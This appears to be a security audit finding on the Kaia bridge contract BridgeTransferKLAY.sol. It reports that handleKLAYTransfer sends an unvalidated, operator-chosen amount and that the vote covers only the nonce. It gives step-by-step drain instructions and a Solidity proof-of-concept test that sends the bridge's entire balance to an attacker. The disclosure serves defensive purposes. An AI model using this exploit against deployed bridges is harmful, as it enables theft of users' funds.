### Title
Single Bridge Operator Can Drain Bridge Contract by Supplying Arbitrary `_value` in `handleKLAYTransfer` — (File: `contracts/service_chain/bridge/BridgeTransferKLAY.sol`)

---

### Summary

`handleKLAYTransfer` in `BridgeTransferKLAY.sol` accepts a caller-supplied `_value` that is never validated against the actual cross-chain request. The internal vote (`_voteValueTransfer`) only gates on the request nonce, not on the transfer amount, recipient, or any other parameter. Because the default operator threshold is **1**, a single authorized bridge operator can call `handleKLAYTransfer` with an inflated `_value` and drain the entire KAIA balance of the bridge contract in one transaction.

---

### Finding Description

`handleKLAYTransfer` is the on-chain settlement function called by bridge operators to release KAIA on the destination chain after a cross-chain request:

```solidity
function handleKLAYTransfer(
    bytes32 _requestTxHash,
    address _from,
    address payable _to,
    uint256 _value,          // ← fully operator-controlled, never validated
    uint64 _requestedNonce,
    uint64 _requestedBlockNumber,
    bytes memory _extraData
)
    public
    onlyOperators
    nonReentrant
{
    _lowerHandleNonceCheck(_requestedNonce);

    if (!_voteValueTransfer(_requestedNonce)) {   // ← votes only on nonce
        return;
    }

    _setHandledRequestTxHash(_requestTxHash);
    handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
    _updateHandleNonce(_requestedNonce);

    emit HandleValueTransfer(..., _value, ...);

    (bool ok, ) = _to.call.value(_value)("");     // ← sends operator-chosen amount
    require(ok, "handleKLAYTransfer: transfer failed");
}
``` [1](#0-0) 

The critical observation is that `_voteValueTransfer(_requestedNonce)` takes **only the nonce** as its argument. It records operator approval for "process nonce N" — it does not commit to `_value`, `_to`, `_from`, or `_requestTxHash`. Once the threshold of approvals for a given nonce is reached, the function proceeds to transfer exactly `_value` wei to `_to`, both of which are taken verbatim from the calling operator's arguments. [2](#0-1) 

The default operator threshold for value transfers is **1**:

```
expect(await bridge.operatorThresholds(VoteType.ValueTransfer)).to.equal(1);
``` [3](#0-2) 

This means a single registered operator can unilaterally execute any `handleKLAYTransfer` call with any `_value` and any `_to` address, with no on-chain proof that those parameters match the original cross-chain request event.

The `_setHandledRequestTxHash` guard only prevents the same `_requestTxHash` from being processed twice; it does not validate that `_value` matches what the source-chain transaction actually locked. [4](#0-3) 

---

### Impact Explanation

A single malicious or compromised bridge operator can:

1. Observe any legitimate `RequestValueTransfer` event on the source chain (e.g., a user locking 1 KAIA).
2. Call `handleKLAYTransfer` on the destination bridge with `_value = address(bridge).balance` and `_to = attacker`.
3. Because threshold = 1, `_voteValueTransfer` immediately returns `true`.
4. The bridge sends its entire KAIA balance to the attacker.
5. The source-chain nonce is marked handled, so the legitimate user's 1 KAIA transfer is also consumed — the user receives nothing.

This is an **unauthorized transfer of all KAIA held in the bridge contract**, matching the allowed impact gate: *"Unauthorized transfer … affecting KAIA, bridged assets, or system-managed funds."*

---

### Likelihood Explanation

The default `operatorThresholds[VoteType.ValueTransfer]` is 1, so no collusion is required. Any single operator — whether malicious from the start or whose key is later compromised — can execute the drain in a single transaction. The operator role is granted by the bridge owner, making it a semi-trusted but reachable attack surface, directly analogous to the `onlyBorrower` role in the seed report.

---

### Recommendation

1. **Commit the full transfer parameters in the vote.** `_voteValueTransfer` should hash `(requestTxHash, from, to, value, tokenType, requestedNonce)` and require a quorum of operators to agree on the same hash before executing. A single operator voting on a nonce alone is insufficient.

2. **Raise the default threshold.** The default `operatorThresholds[VoteType.ValueTransfer]` should be set to require at least a majority of registered operators (e.g., `ceil(N/2) + 1`), not 1.

3. **Validate `_value` against an on-chain commitment.** Consider storing a hash of the expected transfer parameters when the first operator votes, and requiring all subsequent votes to match that hash before execution.

### Proof of Concept

```solidity
// Assume: bridge has 100 ether, threshold = 1, operator = attacker
// Legitimate user locked 1 ether on source chain, generating txHashX at nonce 0.

function testDrainBridgeAsOperator() public {
    // Fund the bridge
    bridge.chargeWithoutEvent{value: 100 ether}();

    // Attacker is a registered operator (threshold = 1)
    vm.startPrank(attacker);

    uint256 balanceBefore = attacker.balance;

    // Call handleKLAYTransfer with inflated _value = 100 ether
    // _value is never validated against the actual 1 ether request
    bridge.handleKLAYTransfer(
        txHashX,          // legitimate source-chain tx hash
        user,             // original from
        attacker,         // redirect to attacker
        100 ether,        // inflated value — bridge holds 100 ether
        0,                // valid nonce
        blockNum,
        ""
    );

    uint256 balanceAfter = attacker.balance;

    // Attacker drained 100 ether; user's 1 ether request is marked handled
    assert(balanceAfter == balanceBefore + 100 ether);
    assert(address(bridge).balance == 0);
    vm.stopPrank();
}
